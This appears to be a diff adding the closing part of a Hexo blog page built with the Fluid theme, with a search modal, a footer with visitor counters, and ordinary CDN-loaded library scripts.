+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
